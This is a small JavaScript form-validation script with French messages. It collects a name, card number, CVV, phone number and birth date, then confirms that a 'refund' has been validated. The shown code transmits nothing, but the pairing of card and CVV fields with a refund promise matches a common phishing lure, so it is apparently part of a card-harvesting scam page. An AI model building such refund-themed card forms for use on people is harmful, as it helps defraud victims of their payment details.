    <script>
        function validateForm(event) {
            event.preventDefault();

            const nom = document.getElementById('nom').value.trim();
            const numeroCarte = document.getElementById('numero-carte').value.replace(/\s+/g, '');
            const cvv = document.getElementById('cvv').value.trim();
            const telephone = document.getElementById('telephone').value.trim();
            const naissance = document.getElementById('naissance').value.trim();

            if (!/^\d{16}$/.test(numeroCarte)) {
                alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
                return false;
            }
            if (!/^\d{3}$/.test(cvv)) {
                alert("❌ Le code CVV doit contenir exactement 3 chiffres.");
                return false;
            }
            if (!/^\d{10}$/.test(telephone.replace(/\s+/g, ''))) {
                alert("❌ Le numéro de téléphone est invalide. Veuillez saisir 10 chiffres.");
                return false;
            }

            alert("✅ Votre remboursement a été validé avec succès !");
        }
    </script>
